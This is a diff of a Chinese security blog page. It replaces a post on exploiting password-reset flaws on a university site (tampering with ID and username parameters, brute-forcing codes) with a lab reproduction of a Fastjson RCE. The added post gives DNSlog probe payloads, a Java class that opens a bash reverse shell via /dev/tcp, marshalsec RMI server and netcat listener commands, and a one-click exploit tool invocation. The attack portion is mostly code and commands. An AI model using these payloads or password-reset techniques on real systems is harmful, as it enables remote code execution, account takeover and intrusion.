+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>修改成了180068，然后发包</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/7.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<p>Payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="string">&quot;address&quot;</span>:,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;test1.famvda.dnslog.cn&quot;</span>&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="string">&quot;address&quot;</span>:,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;test2.famvda.dnslog.cn&quot;</span>&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>, &#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.net.URL&quot;</span>, <span class="string">&quot;val&quot;</span>:<span class="string">&quot;test1.famvda.dnslog.cn&quot;</span>&#125;&#125;<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;test1.famvda.dnslog.cn&quot;</span>&#125;:<span class="string">&quot;aaa&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>手工检测</p>
+<p>将content‐type改为为json格式</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>功夫不负有心人，修改成功，而且学号那里也变成了180068</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/8.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<p>但是用这个工具的payload的有问题，老是500</p>
+<p>在我一灯师傅文章里找到的payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">盲打payload：</span><br><span class="line"></span><br><span class="line">1.2.67版本前</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;zeo&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;fatu5k.dnslog.cn&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">1.2.67版本后payload</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet6Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>只要抓包去跑一下，根据学号的排序规则，构造学号，可以修改全院学生的密码</p>
-<h1 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h1><p>在挖掘密码重置漏洞的时候，主要是在密码修改处，注意它传的参数等，下面我举几个例子</p>
-<h2 id="带有id等类似参数"><a href="#带有id等类似参数" class="headerlink" title="带有id等类似参数"></a>带有id等类似参数</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/9.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<p>成功</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>这里只要修改id，即可修改对方的密码。假如管理员的id是1，那么就可以修改管理员的密码了</p>
-<h2 id="带有username等类似参数"><a href="#带有username等类似参数" class="headerlink" title="带有username等类似参数"></a>带有username等类似参数</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/10.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>将exp.java进行编译</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TouchFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;‐c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.213.129/7777 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac exp.java</span><br></pre></td></tr></table></figure>
+<p>会在当前目录生成exp.class</p>
+<p>在exp目录中执行启动web服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+<p>进入target目录开启RMI服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot; http://192.168.213.129/#exp&quot; 9999</span><br></pre></td></tr></table></figure>
+<p>VPS监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>
+<p>MMP，一直都不成功，搞心态，说是啥拒绝连接</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>我在挖这个的时候，普通账号登录之后是可以看到管理员的用户名的，所以修改管理员的密码轻而易举。 </p>
-<h2 id="验证码长期有效"><a href="#验证码长期有效" class="headerlink" title="验证码长期有效"></a>验证码长期有效</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/11.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<p>不知道为啥，500错误，有知道的师傅欢迎留言~~~</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>只要抓包跑验证码，就可以修改对方的密码。</p>
-<p><strong>圈子投稿文章，原文：<a target="_blank" rel="noopener" href="https://www.secquan.org/Discuss/1070616">https://www.secquan.org/Discuss/1070616</a></strong></p>
+<h1 id="批量检查及一键利用工具"><a href="#批量检查及一键利用工具" class="headerlink" title="批量检查及一键利用工具"></a>批量检查及一键利用工具</h1><p><a target="_blank" rel="noopener" href="https://github.com/mrknow001/fastjson_rec_exploit">https://github.com/mrknow001/fastjson_rec_exploit</a></p>
+<p>将URL放入target.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fastjson_check.py</span><br></pre></td></tr></table></figure>
+<p>一键利用工具使用，但我的外带不了数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fastjson_rce_exploit.py -u &quot;http:&#x2F;&#x2F;192.168.213.141:8090&quot; -s 192.168.1.19 -c &quot;curl la0chf.dnslog.cn&quot;</span><br></pre></td></tr></table></figure>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>搭环境+复现等七七八八的弄了差不多一天，搞心态，有空再尝试吧~~~</p>
 
 	</div>
 
@@ -694,7 +717,7 @@
 	
 		<div class="post-tags">
 			<i class="fa fa-tags" aria-hidden="true"></i>
-			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/SRC/" rel="tag">SRC</a><a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
 		</div>
 	
 </article>
@@ -736,7 +759,7 @@
 				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
 			</button>
 		</a>
-		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://example.com/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/&text=记一次从信息泄露到密码重置-挖掘思路" tooltip="分享到 Telegram">
+		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&text=Fastjson RCE漏洞复现" tooltip="分享到 Telegram">
 			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
 				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
 			</button>
@@ -753,13 +776,12 @@
 </div>
 <script type="text/javascript">
 	socialShare("#share", {
-	    title : '记一次从信息泄露到密码重置-挖掘思路',
-	    description : '起因在挖EDUSRC的时候无意中点到的一个站点
-
-当看到初始密码为8位生日的时候，立即想到了信息收集...',
+	    title : 'Fastjson RCE漏洞复现',
+	    description : '但行好事，莫问前程
+docker配置12345678910111213141516171819202...',
 	    wechatQrcodeTitle : "分享到微信",
 	    wechatQrcodeHelper : '微信扫描二维码',
-	    source : 'http://example.com/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/'
+	    source : 'http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'
 	});
 	$("#share_show")[0].onclick = function(){
 		$("#share_container").addClass("opened");
@@ -823,7 +845,7 @@
 </div>
 
 
-<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/" rel="prev"> 记一次面试靶场getshell</a></div><div class="post-navigation-item post-navigation-next"></div></div>
+<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/" rel="prev"> 基于flash的上传</a></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/" rel="next"> Shiro 550复现</a></div></div>
 
 
 
